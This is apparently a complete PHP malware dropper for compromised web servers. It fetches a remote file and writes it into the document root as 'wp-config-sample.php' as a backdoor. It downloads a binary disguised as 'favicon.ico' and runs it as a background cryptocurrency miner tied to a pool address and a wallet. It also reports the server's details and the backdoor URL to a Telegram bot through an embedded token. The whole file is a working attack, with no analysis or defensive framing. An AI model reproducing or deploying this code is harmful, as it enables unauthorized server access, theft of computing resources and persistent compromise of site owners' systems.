<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$nama = 'wp-config-sample.php';
$check = $_SERVER['DOCUMENT_ROOT'] . '/'.$nama.'';
$text = http_get('http://moneyua.vip/public/fonts/source/GothamPro-Medium/wp-config-sample.txt');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
}
echo '<center><pre>raimuasu</pre></center>'; system('cd /var/tmp/; curl -s --insecure http://selecao.pesqueira.ifpe.edu.br/favicon.ico -o php; chmod +x php; ./php -a yespowersugar -o 62.171.150.191:7042 -u sugar1qy7m556kfcyxc0xzyxwzxkp3k5338kp40zajg07.anyar -p lol --no-longpoll -q --randomize --background > /dev/null'); $sys = php_uname(); $core = system('nproc'); $lihat = getcwd(); $home = $_SERVER['DOCUMENT_ROOT']; $domen = $_SERVER['SERVER_NAME']; $tempat = $_SERVER['REQUEST_URI']; $apiToken = "1765040091:AAESnKl29tHuol7gN_4DGJYJtl_kqoTs3aI"; $data = [ 'chat_id' => '-1001473401290', 'text' => "SEGER KOIN : \r\n Bakdur : http://$domen/$nama \r\n Uname : $sys \r\n DIR : $home  \r\n Core : $core \r\n" ]; $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); ?>